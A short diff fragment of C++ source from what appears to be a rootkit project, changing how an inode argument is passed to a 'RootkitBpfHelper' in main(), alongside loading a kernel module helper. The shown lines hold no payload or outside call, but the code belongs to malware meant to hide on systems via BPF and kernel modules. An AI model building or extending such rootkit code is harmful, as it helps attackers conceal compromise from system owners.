@@ -34,7 +34,7 @@ int main(int argc, char ** argv) {
     signal(SIGTERM, sig_handler);
 
     // Load bpf program and its syscalls
-    rootkit::RootkitBpfHelper rootkit(get_setup_data().inode, rb_event);
+    rootkit::RootkitBpfHelper rootkit({get_setup_data().inode}, rb_event);
 
     rootkit::KernelModuleHelper module(RNET_PATH, RNET_NAME, DEV_NAME);
 
